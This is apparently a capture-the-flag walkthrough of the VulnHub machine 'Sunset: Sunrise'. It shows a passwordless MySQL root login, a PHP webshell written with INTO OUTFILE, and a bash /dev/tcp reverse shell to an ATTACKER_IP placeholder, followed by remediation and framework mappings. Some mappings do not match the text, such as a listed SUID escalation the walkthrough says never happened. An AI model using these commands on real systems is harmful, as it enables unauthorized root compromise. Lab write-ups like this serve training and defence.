# Sunset: Sunrise — The Database That Wanted to Be Root

Alright dude, Sunset: Sunrise is one of those machines that makes you go "wait, that's it?!" in the best possible way. No cap, it's a textbook example of how a single misconfiguration, MySQL exposed to the network with no password AND running as the Linux root user, collapses every security layer between you and full system compromise. No lateral movement, no privilege escalation steps: just MySQL to root in one shot. Legit terrifying in a real-world context. Big thanks to the creator for building something that teaches a critical real-world lesson with zero fluff.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Sunset: Sunrise |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sunset-sunrise,406/ |
| **Techniques** | Network service enumeration, MySQL unauthenticated login, SQL INTO OUTFILE webshell, PHP reverse shell, direct root via misconfigured DB process |
| **CVEs** | CWE-287 (Improper Authentication: MySQL no-password root), CWE-250 (Execution with Unnecessary Privileges: MySQL running as OS root), CWE-434 (Unrestricted File Write via INTO OUTFILE) |
| **APT Groups** | APT41 (Winnti Group): routinely exploits exposed database services as initial access in enterprise networks; FIN7: uses exposed MySQL instances for lateral movement and data exfiltration in retail/hospitality sectors |

---

## Attack Summary

```
netdiscover → target IP
    |
    v
nmap → port 22 (SSH), port 3306 (MySQL), port 8080 (HTTP Weborf)
    |
    v
mysql -h TARGET -u root --skip-password → login succeeds (no password)
    |
    v
SELECT user() → root@localhost (MySQL runs as OS root)
    |
    v
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
    |
    v
curl http://TARGET:8080/shell.php?cmd=id → uid=0(root)
    |
    v
reverse shell via webshell → nc listener → root shell
    |
    v
cat /root/flag.txt → GG
```

---

## Methodology

1. Host discovery to identify the target IP on the network
2. Full port scan with service version detection
3. Identify MySQL exposed on port 3306 accessible from attacker
4. Attempt unauthenticated root login to MySQL
5. Confirm MySQL process runs as OS root user
6. Write PHP webshell to web root via SQL INTO OUTFILE
7. Trigger webshell and confirm code execution as root
8. Deliver reverse shell through the webshell
9. Read root flag

---

## Step 1 — Host Discovery

```bash
sudo netdiscover -r 192.168.1.0/24
```

```
IP            At MAC Address     Count     Len  MAC Vendor
192.168.1.107  08:00:27:xx:xx:xx    1      60   PCS Systemtechnik GmbH (VirtualBox)
```

Set your target:

```bash
export TARGET=192.168.1.107
```

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Full Port Scan

```bash
nmap -p- -sV -sC $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB
8080/tcp open  http    Weborf httpd
```

Three services: SSH, MySQL, HTTP. MySQL on 3306 exposed to the network is the immediate red flag. In any production environment, MySQL should be bound to 127.0.0.1. Seeing it exposed externally is a critical misconfiguration.

**Alternatives:** `masscan -p- --rate=10000 $TARGET` for faster discovery on large port ranges.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — MySQL Unauthenticated Root Login

```bash
mysql -h $TARGET -u root --skip-password
```

```
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

Login succeeds with no password. Check who MySQL is running as:

```sql
SELECT user();
-- root@%

SHOW VARIABLES LIKE 'secure_file_priv';
-- Value: (empty) — file writes allowed everywhere
```

An empty `secure_file_priv` means MySQL can write files to any directory the OS-level process has access to. Since the process runs as root, that means anywhere.

**Real-world note:** Thousands of internet-facing MySQL instances accept unauthenticated root connections. Shodan regularly indexes hundreds of these. APT41 has used unauthenticated MySQL access as an initial foothold in multiple documented intrusions. The fix: bind to 127.0.0.1, set a strong root password, and configure `secure_file_priv`.

**MITRE ATT&CK:** T1078.003 — Valid Accounts: Local Accounts; T1190 — Exploit Public-Facing Application

---

## Step 4 — Write PHP Webshell via INTO OUTFILE

Identify the Weborf web root (usually `/var/www/html/`):

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
-- Query OK, 1 row affected
```

Verify access:

```bash
curl "http://$TARGET:8080/shell.php?cmd=id"
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root)
```

The webshell runs as root because MySQL runs as root. This one step confirms total system compromise.

**Real-world note:** `SELECT INTO OUTFILE` webshell delivery has been a standard technique since the early 2000s. It was used in multiple mass exploitation campaigns. The technique is blocked by setting `secure_file_priv` to a non-empty, restricted path.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Reverse Shell as Root

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell via the webshell (URL-encode the payload):

```bash
curl -G "http://$TARGET:8080/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

Or browse to:

```
http://TARGET:8080/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

The shell lands as root.

**Shell stabilization:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm; export SHELL=bash
# Ctrl+Z, then: stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Root Flag

```bash
whoami
# root

find / -name "flag*" -o -name "proof*" 2>/dev/null | head -10
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root in one chain. No privesc needed. That is the whole machine.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| MySQL login | root (no password) | MySQL port 3306 | Database access + webshell write |
| Webshell | /var/www/html/shell.php | Written via INTO OUTFILE | Code execution as root |
| Root flag | (varies) | /root/flag.txt | Challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | MySQL exposed on port 3306 with no root password | CISA Alert AA22-074A explicitly warns about exposed database services; APT41 uses them as initial access | Bind MySQL to 127.0.0.1; set strong root password; firewall port 3306 from external access |
| 2 | MySQL running as OS root user | Database compromise becomes full OS compromise: no escalation needed | Run database as a dedicated low-privilege user (e.g., `mysql`); never as root or a privileged account |
| 3 | secure_file_priv not set | Enables arbitrary file write to any path accessible by the DB process | Set `secure_file_priv` to a restricted path or disable file writes entirely |
| 4 | Webshell persistence via database | Once written, the webshell persists until manually removed | Regular web root integrity checks; file integrity monitoring (FIM) |
| 5 | Direct path to root in one step | Real APT campaigns exploit this pattern for immediate system takeover | Defense in depth: even if one control fails, others must limit blast radius |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Valid Accounts: Local Accounts | T1078.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: SUID | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Bind MySQL to localhost only:** `bind-address = 127.0.0.1` in `/etc/mysql/my.cnf`
2. **Set MySQL root password:** `ALTER USER 'root'@'localhost' IDENTIFIED BY '<strong_password>';`
3. **Run MySQL as non-root OS user:** verify `mysqld` runs as `mysql` user, not root
4. **Configure secure_file_priv:** `secure_file_priv = /var/lib/mysql-files/` (restrict writes)
5. **Firewall port 3306:** `ufw deny 3306` or equivalent; only allow from application servers
6. **Enable MySQL audit logging:** track all connections and queries

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all database services; mark network exposure |
| Protect | Access Control | Authentication required for all DB accounts; no passwordless root |
| Protect | Data Security | Restrict file write capabilities in database configuration |
| Detect | Anomalies and Events | Alert on unauthenticated MySQL connections; new files in web root |
| Respond | Response Planning | Remove webshells; rotate credentials; isolate compromised host |
| Recover | Recovery Planning | Rebuild host; audit all data accessed via unauthenticated DB connection |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Require authentication for all MySQL accounts |
| AC-6 | Least Privilege | Run MySQL as dedicated low-privilege OS user |
| CM-7 | Least Functionality | Disable MySQL network access unless required; restrict file write |
| IA-5 | Authenticator Management | Enforce strong passwords for all DB accounts |
| SC-7 | Boundary Protection | Firewall database ports; no external exposure |
| SI-3 | Malware Protection | File integrity monitoring on web root directories |

### CISA KEV

Unauthenticated MySQL access combined with INTO OUTFILE webshell delivery maps directly to CISA Alert AA21-131A (exploitation of database services for initial access) and AA22-074A (network-accessible database services exploited by ransomware groups). Organizations must patch, restrict, and monitor database services per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (bind MySQL to localhost; disable passwordless root)
- **D3-OAM** — Operating System Administrative Management (MySQL runs as unprivileged user)
- **D3-HBPI** — Harden Build Pipeline Integrity (no default credentials in deployed services)
- **D3-FH** — File Hashing (FIM on web root to detect injected webshells)

---

## Final Thoughts

Sunset: Sunrise is a masterclass in "what happens when you skip the security checklist." The machine requires zero exploitation skills: it is purely about recognizing a misconfiguration and knowing the standard technique to abuse it. That is exactly what makes it valuable for beginners. The lesson is simple: exposed database ports plus no authentication plus root process ownership equals game over. No CVE needed, no 0-day, no social engineering.

In real engagements, finding an exposed MySQL port during a scan is always worth a quick `mysql -h target -u root --skip-password` check. You would be surprised how often it works. fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
